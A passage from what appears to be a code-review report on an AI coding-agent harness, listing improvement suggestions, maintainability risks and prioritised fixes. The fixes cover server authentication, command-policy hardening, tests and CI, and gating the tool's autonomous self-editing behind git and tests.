  - `_parse_text_tool_calls` (JSON, XML, nested braces)
  - `session/compactor.needs_compaction` boundary
  - `evolution/scorer.score` edge cases
  - `skills/__init__.match` keyword matching
  Target coverage on `tools/*.py` and `session/*.py` first — they're pure-functional enough to test without mocking Ollama.

### 5.2 Replace regex denylist with a parsed-argv policy (High ROI)
- See §2.1. Also enables: per-binary approval ("always allow `git status`, never allow `git push` without confirm").

### 5.3 Structured diff preview in `confirm_write` for large files (Medium ROI)
- **Location:** `main.py:285-317`
- **Observation:** Already implements unified diff + truncation at 60 lines — good. But no syntax highlighting, no side-by-side. For large refactors the ask is repeatedly "y".
- **Suggestion:** Use `rich.syntax.Syntax` for colored diff; add `?` option to open a scrollable pager.

### 5.4 Extract system prompt into editable file (Medium ROI)
- **Location:** `agent.py:15-44`
- **Observation:** `SYSTEM_PROMPT` is a multiline f-string in code. Users can't customize without editing Python.
- **Suggestion:** Store in `HARNESS.md` section parsed by `profile.py` or `prompts/system.md`.

### 5.5 Add `--config` and `--print` symmetry (Low ROI)
- **Location:** `main.py:1420-1424`
- **Observation:** `-p/--print` exists, `--continue` exists, but no `--config` override, no `--mode`, no `--model`.
- **Suggestion:** Argparse flags wired to `config.runtime_override`.

### 5.6 Persist `/mode` change (Low ROI)
- **Location:** `main.py:1270-1279`
- **Observation:** `/mode full-auto` is session-scoped; restart reverts to profile default. Easy to forget.
- **Suggestion:** Offer `/mode <x> save` to write into `.harness.toml`.

### 5.7 First-class MCP server install flow (Medium ROI)
- **Observation:** `[[mcp_servers]]` block in `.harness.toml` is documented but no `/mcp` command to list/add/remove at runtime. `tools/mcp.py` is capable but the UX is invisible.
- **Suggestion:** `/mcp list`, `/mcp add <name> <cmd>`, `/mcp reload`.

### 5.8 Streamed tool results to client (Medium ROI)
- **Observation:** Long `run_command` blocks until completion. For builds, tests, installs the user sees nothing for 30 seconds.
- **Suggestion:** Stream stdout line-by-line via `on_tool_stream` callback.

### 5.9 Replace hand-rolled spinner with `rich.live.Live` (Low ROI)
- See §1.12.

### 5.10 Add `HARNESS_PROFILE=strict` preset (Medium ROI)
- **Observation:** New users have to know the right combination of `approval_mode`, `confirm_writes`, `confirm_bash`, hooks. A named preset would drop friction.
- **Suggestion:** `profile.py` loads `DEFAULTS.presets = {'strict': {...}, 'dev': {...}}`.

### 5.11 Ship a `requirements.txt` / `pyproject.toml` (High ROI)
- **Observation:** No manifest for Python deps (`chromadb`, `rich`, `prompt_toolkit`, `requests`, `ddgs`, `websockets`, `textual`, `tomllib` is stdlib in 3.11+). New contributors must reverse-engineer from imports. `.venv/` already has versions pinned de-facto.
- **Suggestion:** Generate a `pyproject.toml` from the current venv; add `pip install -e .` instruction.

### 5.12 Add a `/diag` command (Medium ROI)
- **Observation:** Onboarding failure modes (Ollama down, wrong model, missing ddgs, claude CLI missing, index corrupt) are reported piecemeal.
- **Suggestion:** `/diag` runs all health checks and prints a table: Ollama ✓, Model ✓, DB ✓, Claude ✓, Hooks ✓.

### 5.13 Resume `.context-handoff.md` pattern (Low ROI)
- **Observation:** `.context-handoff.md` exists at root and is a nice convention but ad-hoc. `/save` stores JSON dumps; no human-readable running log.
- **Suggestion:** After each session, export Markdown summary to `.planning/handoff/{date}.md`.

---

## 6. Maintainability Risks

### 6.1 No tests, no CI (Critical)
- **Observation:** Empty `benchmarks/`, zero `test_*.py`. No GitHub Actions workflow. `evolution/executor` literally runs `python -c 'import agent, tools, config, profile'` as its "test" (`evolution/executor.py:173-177`) — that's the safety net for autonomous self-editing code.
- **Suggestion:** Minimum viable CI: `ruff check` + `pytest tests/` + `python -c 'import agent, tools, config, profile, session, evolution, context, skills'`.

### 6.2 No dependency manifest, no Python version pin (High)
- **Observation:** `.venv/lib/python3.14` — Python 3.14 is pre-release. No `.python-version`, no `pyproject.toml`. `tomllib` use (`profile.py:2`) silently requires 3.11+.
- **Suggestion:** Add `pyproject.toml` with `requires-python = ">=3.11"`, `tool.ruff`, `tool.pytest` sections. Document how to pin dev deps.

### 6.3 Gitignored files that are load-bearing (High)
- **Location:** `.gitignore:12-14`: `harness_app.py`, `harness_server.py`, `ui/node_modules/` are ignored
- **Observation:** `harness_server.py` is documented in `CLIENT_SETUP.md` as the thing you start (`cd ~/harness && .venv/bin/python harness_server.py`). Yet it is not in git. Future contributors clone the repo and cannot start the server described in the README. `harness_app.py` (909 lines of Textual UI) is also ignored.
- **Suggestion:** Decide: if these are experimental, move to `experimental/` and note it; if they're shipping, un-ignore them and add tests. Current state is the worst of both.

### 6.4 `HARNESS.md` (the canonical doc) is terse and does not reflect current commands (Medium)
- **Location:** `HARNESS.md` (51 lines)
- **Observation:** Does not mention `/cloop`, `/evolve`, skills system, approval modes, hooks, MCP servers — all implemented. The doc is the one thing included in every system prompt, so staleness pollutes every session.
- **Suggestion:** Regenerate from `SLASH_COMMANDS` dict on each commit.

### 6.5 `CLIENT_SETUP.md` gives incomplete server-side instructions (Medium)
- **Location:** `CLIENT_SETUP.md`
- **Observation:** Tells the client how to connect but says nothing about how the server is launched (env vars, token generation is hinted, but `HARNESS_BIND`, `HARNESS_TOKENS` CSV format, firewall reminder, TLS — all missing).
- **Suggestion:** Add a `SERVER_SETUP.md` twin.

### 6.6 `.context-handoff.md` is committed and encodes a snapshot-in-time (Low)
- **Location:** `.context-handoff.md`
- **Observation:** Lines 4-24 enumerate what was changed "이전 세션" / "이번 세션" — already stale by the next commit. Committed state of a living doc creates friction.
- **Suggestion:** Move to `.gitignore` or to `docs/history/`.

### 6.7 `MEMORY.md` flags a stalled UX effort (`/Users/johyeonchang/.claude/projects/.../MEMORY.md`) (Low)
- **Observation:** Claude's auto-memory notes: "UX 고도화 5개 항목 구현 중단(컨텍스트 소진), 다음 세션에서 1번(diff 미리보기)부터 재개 필요". Item 1 (diff 미리보기) appears implemented in `main.py:288-316`. The remaining 4 items are not enumerated here.
- **Suggestion:** Surface the TODO list in the repo (`TODO.md` or GitHub issues) so it isn't hostage to one assistant's private memory.

### 6.8 `skills/` frontmatter parsed without schema validation (Low)
- See §2.8. Also: if a skill file has no `keywords:`, it is silently dropped. No log.
- **Suggestion:** Warn on load when a `.md` in `skills/` has no valid frontmatter.

### 6.9 No logging framework — `print`/`console.print` everywhere (Medium)
- **Observation:** No `logging.getLogger(__name__)` anywhere in harness code. Debugging tool failures means re-running with `print` statements.
- **Suggestion:** Adopt `logging` with level controlled by `HARNESS_LOG_LEVEL`, route non-UI messages there.

### 6.10 Autonomous self-editing loops have no audit review gate (High)
- **Location:** `evolution/engine.py`, `evolution/executor.py`, `evolution/idle_runner.py`
- **Observation:** `idle_runner` + `execute_pending(force=False)` modifies `config.py`, `agent.py`, `tools/*.py`, `context/*.py` while user is AFK, with `confirm_write=lambda p: True` (idle_runner line 108). Validation is `py_compile` + `import agent, tools, config, profile` + tool count sanity. None of that catches semantic regressions (e.g. a broken regex in `classify_command`).
- **Suggestion:** Require a diff to be committed to a `proposals/` branch rather than master; run pytest against the diff; only apply if green. At minimum, auto-commit every self-edit with a descriptive message so `git log` explains the history.

### 6.11 Korean-only user-facing strings (Low)
- **Observation:** All UI strings, error messages, and prompts are Korean only. Fine for the current audience; becomes a maintenance burden if contributions come from outside the community. No i18n scaffolding.
- **Suggestion:** At minimum, keep English in error messages used by `tool_failure` logs so they're grep-friendly across languages.

### 6.12 `run.sh` + `harness` launchers assume `.venv` layout (Low)
- **Location:** `run.sh:4` (`.venv/bin/python main.py`), `harness:2`
- **Observation:** Hardcoded `.venv`. A contributor who uses `poetry`, `uv`, or global Python has to edit scripts.
- **Suggestion:** Detect `VIRTUAL_ENV` or fall back to `python3 -m`.

---

## Top 5 Recommended Next Actions (by ROI)

1. **Fix the server auth + API bugs (§1.1 + §2.2 + §1.3).**
   The WS server crashes on authenticated connections (`request_headers` removed in websockets 14) *and* the unauthenticated path listens on `0.0.0.0`. Both are one-hour fixes; together they unblock the `/cloop` remote workflow and close a remote-shell hole. Pair with constant-time token compare (§2.3).

2. **Harden `run_command` (§2.1 + §1.10).**
   Replace the `_DANGEROUS` regex with a shlex-based classifier that inspects argv tokens and flags redirects, pipes-to-shell, and PATH-relative binaries. This is the single highest-impact security change given that `full-auto` mode exists.

3. **Add a minimal pytest suite + `pyproject.toml` (§5.1 + §5.11 + §6.1 + §6.2).**
   Start with 30 tests covering `classify_command`, `_parse_text_tool_calls`, `compactor`, `scorer`, `skills.match`. Ship a `pyproject.toml` with deps pinned and `requires-python = ">=3.11"`. Wire `ruff + pytest` into a GitHub Actions workflow. Pays off every future edit — especially self-editing ones (§6.10).

4. **Consolidate the three frontends behind a `HarnessCore` (§3.2 + §3.1 + §3.3).**
   `main.py` (1 680 lines), `harness_server.py` (444 lines), `harness_app.py` (909 lines) re-implement the same orchestration. Extract a stateless core with injected callbacks, then have each frontend become a thin adapter. Prevents drift like §1.3 and makes slash-command additions one-place changes.

5. **Gate autonomous self-editing behind git + tests (§6.10 + §1.16).**
   `idle_runner._run_idle_evolution` rewrites harness source files unattended, with `py_compile + import` as the only validation. Require each proposal to be applied on a throwaway branch, run the pytest suite (see #3), and only merge-fast-forward on success. Commit every self-edit with the proposal key in the message so `git log` explains why code changed. This turns the boldest feature of the project from "scary" into "auditable".
